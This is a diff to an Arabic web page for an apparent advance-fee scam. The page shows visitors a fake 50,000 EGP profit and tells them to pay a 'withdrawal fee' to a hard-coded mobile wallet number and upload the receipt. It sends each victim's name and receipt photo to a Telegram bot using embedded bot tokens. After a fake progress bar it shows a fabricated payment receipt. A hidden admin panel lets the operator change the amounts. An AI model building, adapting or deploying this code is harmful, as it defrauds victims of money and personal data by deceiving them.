@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة التقوى | الإدارة الذكية</title>
+    <title>منصة التقوى | الصرف الرقمي</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #0a0b1e; --gold: #ffd700; --green: #00ff88; --glass: rgba(255, 255, 255, 0.1); }
-        body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--primary); color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; user-select: none; }
+        :root { --primary: #0a0b1e; --gold: #ffd700; --green: #28a745; --glass: rgba(255, 255, 255, 0.1); }
+        body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--primary); color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; user-select: none; }
         
         .card { background: var(--glass); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.15); border-radius: 25px; width: 90%; max-width: 400px; padding: 30px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.5); position: relative; }
         
@@ -17,16 +17,23 @@
         .profit-box { background: rgba(0,0,0,0.5); padding: 15px; border-radius: 15px; border-right: 4px solid var(--gold); margin: 15px 0; }
         .wallet-display { background: #000; color: var(--gold); padding: 12px; border-radius: 10px; font-weight: bold; font-size: 19px; margin-bottom: 10px; border: 1px dashed var(--gold); }
 
-        /* لوحة الإدارة */
         #admin-panel { position: fixed; inset: 0; background: #000; z-index: 10000; display: none; flex-direction: column; align-items: center; justify-content: center; overflow-y: auto; padding: 20px; }
         .admin-content { background: #111; padding: 20px; border-radius: 20px; border: 1px solid var(--gold); width: 100%; max-width: 320px; }
-        .admin-content label { display: block; text-align: right; font-size: 11px; color: var(--gold); margin: 5px 5px 2px 0; }
         
-        /* شاشات الحالة */
-        #verify-screen, #waiting-screen, #step-withdraw { display: none; }
+        #verify-screen, #waiting-screen, #step-withdraw, #success-receipt { display: none; }
         .loader-bar { width: 100%; height: 8px; background: #222; border-radius: 10px; overflow: hidden; margin-top: 20px; }
         .loader-fill { width: 0%; height: 100%; background: var(--green); transition: 0.3s; }
         
+        /* تصميم الإيصال النهائي */
+        .receipt-container { background: white; color: #333; border-radius: 20px; padding: 20px; border: 3px solid var(--green); position: relative; margin-top: 10px; }
+        .receipt-header { color: #000; font-weight: 900; font-size: 24px; margin-bottom: 5px; }
+        .receipt-check { background: var(--green); color: white; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 10px; font-size: 20px; border: 3px solid white; position: absolute; top: -20px; left: 50%; transform: translateX(-50%); }
+        .receipt-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eee; font-size: 14px; }
+        .receipt-label { font-weight: bold; color: #666; }
+        .receipt-value { font-weight: bold; color: var(--green); text-align: left; }
+        .btn-download { background: var(--green); color: white; margin-top: 15px; font-size: 16px; }
+        .btn-back { background: #e9ecef; color: #333; margin-top: 8px; font-size: 14px; }
+
         #admin-trigger { position: fixed; bottom: 0; right: 0; width: 45px; height: 45px; cursor: pointer; z-index: 999; opacity: 0; }
     </style>
 </head>
@@ -34,85 +41,97 @@
 
 <div id="admin-trigger" onclick="runAdmin()"></div>
 
+<!-- لوحة التحكم -->
 <div id="admin-panel">
     <div class="admin-content">
-        <h3 style="color:var(--gold); margin-top:0; text-align:center;">إعدادات المنصة الشاملة</h3>
-        
-        <label>كود دخول الموقع:</label>
-        <input type="text" id="setPass">
-        
-        <label>مبلغ الربح (EGP):</label>
-        <input type="number" id="setProfit">
-        
-        <label>مبلغ الرسوم المطلوبة:</label>
-        <input type="number" id="setFees">
-        
-        <label>رقم محفظة التحويل:</label>
-        <input type="text" id="setWallet">
-        
-        <label>كود "تفعيل السحب" للعميل:</label>
-        <input type="text" id="setConfirmCode">
-        
-        <button onclick="saveConfig()">حفظ كافة التعديلات</button>
+        <h3 style="color:var(--gold); text-align:center;">إعدادات الإدارة</h3>
+        <input type="text" id="setPass" placeholder="كود دخول الموقع">
+        <input type="number" id="setProfit" placeholder="مبلغ الربح">
+        <input type="number" id="setFees" placeholder="الرسوم">
+        <input type="text" id="setWallet" placeholder="رقم محفظتك">
+        <input type="text" id="setConfirmCode" placeholder="كود التفعيل">
+        <button onclick="saveConfig()">حفظ</button>
         <button onclick="document.getElementById('admin-panel').style.display='none'" style="background:#333; color:white; margin-top:8px;">إغلاق</button>
     </div>
 </div>
 
+<!-- 1. الدخول -->
 <div class="card" id="step-login">
     <h2 style="color:var(--gold)">بوابة التقوى</h2>
-    <p style="font-size:13px; color:#aaa;">أدخل كود الوصول للمتابعة</p>
     <input type="password" id="loginPass" placeholder="كود الوصول">
     <button onclick="checkLogin()">دخول الحساب</button>
 </div>
 
+<!-- 2. السحب -->
 <div class="card" id="step-withdraw">
     <div class="profit-box">
-        <span style="font-size:12px; color:#aaa;">أرباحك المتاحة الآن</span>
+        <span style="font-size:12px; color:#aaa;">أرباحك المتاحة</span>
         <div style="font-size:28px; font-weight:900; color:var(--gold);"><span id="profitVal">50,000</span> <small>EGP</small></div>
     </div>
     <input type="text" id="uName" placeholder="الاسم الكامل">
-    <input type="tel" id="uWallet" placeholder="رقم محفظة الاستلام">
-    <p style="font-size:11px; margin-bottom:5px;">حول الرسوم (<span id="feesVal">500</span> ج.م) للرقم التالي:</p>
+    <input type="tel" id="uWallet" placeholder="رقم المحفظة">
+    <p style="font-size:11px;">حول الرسوم (<span id="feesVal">500</span> ج.م) للرقم:</p>
     <div class="wallet-display" id="walletVal">01226811784</div>
-    <label style="display:block; text-align:right; font-size:10px; color:var(--gold);">ارفق صورة إيصال التحويل:</label>
-    <input type="file" id="uFile" accept="image/*" style="background:#fff; color:#000; font-size:12px;">
+    <input type="file" id="uFile" accept="image/*" style="background:#fff; color:#000; font-size:12px; padding: 5px;">
     <button onclick="submitWithdraw()">تأكيد وطلب الكود</button>
 </div>
 
+<!-- 3. كود التفعيل -->
 <div class="card" id="verify-screen">
-    <h3 style="color:var(--gold)">تأكيد عملية السحب</h3>
-    <p style="font-size:12px;">أدخل "كود تفعيل السحب" الذي استلمته من الإدارة لتأكيد هويتك وبدء التحويل.</p>
+    <h3 style="color:var(--gold)">تأكيد الهوية</h3>
     <input type="text" id="confirmCodeInput" placeholder="أدخل كود التفعيل">
-    <button onclick="checkConfirmCode()" style="background:var(--green)">تفعيل وتحويل الآن</button>
+    <button onclick="checkConfirmCode()" style="background:var(--green); color:white;">تفعيل وتحويل الآن</button>
 </div>
 
+<!-- 4. شاشة التحميل -->
 <div class="card" id="waiting-screen">
-    <h3 style="color:var(--green)">جاري معالجة التحويل...</h3>
+    <h3 style="color:var(--green)">جاري التحويل...</h3>
     <div class="loader-bar"><div class="loader-fill" id="fill"></div></div>
     <p id="percent" style="margin-top:10px; font-weight:bold;">0%</p>
-    <p style="font-size:11px; color:#aaa;">يرجى الانتظار، يتم إرسال المبلغ لمحفظتك الآن.</p>
+</div>
+
+<!-- 5. الإيصال النهائي (شاشة النجاح) -->
+<div class="card" id="success-receipt" style="background: rgba(255,255,255,0.05);">
+    <h2 style="color:white; margin-bottom:20px;">تأكيد تسليم الأرباح</h2>
+    <div class="receipt-container">
+        <div class="receipt-check">✔</div>
+        <div class="receipt-header">تهانينا!</div>
+        <div style="margin-bottom:15px; font-weight:bold; color:#555;">تم تسليم الأرباح بنجاح</div>
+        
+        <div class="receipt-row">
+            <span class="receipt-label">المبلغ :</span>
+            <span class="receipt-value"><span id="rProfit">50000</span> جنيه مصري</span>
+        </div>
+        <div class="receipt-row">
+            <span class="receipt-label">اسم المستلم :</span>
+            <span class="receipt-value" id="rName">الاسم</span>
+        </div>
+        <div class="receipt-row">
+            <span class="receipt-label">تاريخ العملية :</span>
+            <span class="receipt-value" id="rDate">2 مايو 2026</span>
+        </div>
+        <div class="receipt-row" style="border:none;">
+            <span class="receipt-label">رقم المرجع :</span>
+            <span class="receipt-value" style="color:#333;" id="rRef">#A73928475621</span>
+        </div>
+        
+        <button class="btn-download" onclick="window.print()">تحميل الإيصال</button>
+        <button class="btn-back" onclick="location.reload()">العودة للوحة التحكم</button>
+    </div>
 </div>
 
 <script>
-    const TOKEN = '8154142175:AAGvcFJuk6eh972IJUujoKV2ibkNIIWlMNA';
-    const CHAT_ID = '8232581666';
+    const TOKEN = '8412077444:AAHgu7XnlUMAaRPayFmUtD14AAbTznPJRII';
+    const CHAT_ID = '8292390266';
 
-    // الإعدادات الافتراضية
-    let config = JSON.parse(localStorage.getItem('at_v7_final')) || {
-        pass: '123456',
-        profit: 50000,
-        fees: 500,
-        wallet: '01226811784',
-        confirmCode: '7788'
+    let config = JSON.parse(localStorage.getItem('at_v9')) || {
+        pass: '123456', profit: 50000, fees: 500, wallet: '01226811784', confirmCode: '7788'
     };
 
     function loadData() {
-        // تحديث الواجهة للمستخدم
         document.getElementById('profitVal').innerText = Number(config.profit).toLocaleString();
         document.getElementById('feesVal').innerText = config.fees;
         document.getElementById('walletVal').innerText = config.wallet;
-        
-        // تحديث قيم لوحة الإدارة
         document.getElementById('setPass').value = config.pass;
         document.getElementById('setProfit').value = config.profit;
         document.getElementById('setFees').value = config.fees;
@@ -125,25 +144,23 @@
         if(document.getElementById('loginPass').value === config.pass) {
             document.getElementById('step-login').style.display = 'none';
             document.getElementById('step-withdraw').style.display = 'block';
-        } else { alert("كود الدخول غير صحيح"); }
+        } else { alert("الكود غير صحيح"); }
     }
 
     async function submitWithdraw() {
         const name = document.getElementById('uName').value;
-        const phone = document.getElementById('uWallet').value;
         const file = document.getElementById('uFile').files[0];
-        if(!name || !phone || !file) return alert("برجاء إكمال البيانات ورفع الإيصال");
+        if(!name || !file) return alert("أكمل البيانات");
 
         const fd = new FormData();
         fd.append('chat_id', CHAT_ID);
         fd.append('photo', file);
-        fd.append('caption', `🔔 عميل جديد دفع الرسوم\n👤 الاسم: ${name}\n📱 رقم العميل: ${phone}\n💰 الربح المعروض: ${config.profit}\n💵 الرسوم: ${config.fees}\n🔑 كود التفعيل المطلوب: ${config.confirmCode}`);
+        fd.append('caption', `🔔 طلب جديد\n👤 العميل: ${name}\n💰 الربح: ${config.profit}\n🔑 الكود: ${config.confirmCode}`);
 
-        alert("تم استلام الإيصال! سيتم تزويدك بكود التفعيل فور مراجعة التحويل.");
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        
         document.getElementById('step-withdraw').style.display = 'none';
         document.getElementById('verify-screen').style.display = 'block';
-        
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
     }
 
     function checkConfirmCode() {
@@ -151,7 +168,7 @@
             document.getElementById('verify-screen').style.display = 'none';
             document.getElementById('waiting-screen').style.display = 'block';
             startLoading();
-        } else { alert("كود التفعيل غير صحيح! تواصل مع الإدارة."); }
+        } else { alert("كود التفعيل غلط!"); }
     }
 
     function startLoading() {
@@ -159,16 +176,32 @@
         let fill = document.getElementById('fill');
         let txt = document.getElementById('percent');
         let interval = setInterval(() => {
-            p += Math.floor(Math.random() * 2) + 1;
+            p += Math.floor(Math.random() * 3) + 1;
             if(p > 100) p = 100;
             fill.style.width = p + "%";
             txt.innerText = p + "%";
             if(p >= 100) {
                 clearInterval(interval);
-                alert("تهانينا! تم إرسال الأموال بنجاح إلى محفظتك.");
-                location.reload();
+                showReceipt();
             }
-        }, 600);
+        }, 500);
+    }
+
+    function showReceipt() {
+        document.getElementById('waiting-screen').style.display = 'none';
+        document.getElementById('success-receipt').style.display = 'block';
+        
+        // تعبئة بيانات الإيصال
+        document.getElementById('rProfit').innerText = Number(config.profit).toLocaleString();
+        document.getElementById('rName').innerText = document.getElementById('uName').value;
+        
+        // تاريخ اليوم
+        const d = new Date();
+        const dateStr = d.getDate() + " مايو " + d.getFullYear();
+        document.getElementById('rDate').innerText = dateStr;
+        
+        // رقم مرجعي عشوائي
+        document.getElementById('rRef').innerText = "#A" + Math.floor(Math.random() * 9000000000 + 1000000000);
     }
 
     let clicks = 0;
@@ -184,12 +217,11 @@
             wallet: document.getElementById('setWallet').value,
             confirmCode: document.getElementById('setConfirmCode').value
         };
-        localStorage.setItem('at_v7_final', JSON.stringify(config));
+        localStorage.setItem('at_v9', JSON.stringify(config));
         loadData();
-        alert("تم حفظ جميع الإعدادات الجديدة بنجاح!");
         document.getElementById('admin-panel').style.display='none';
+        alert("تم الحفظ!");
     }
 </script>
-
 </body>
 </html>
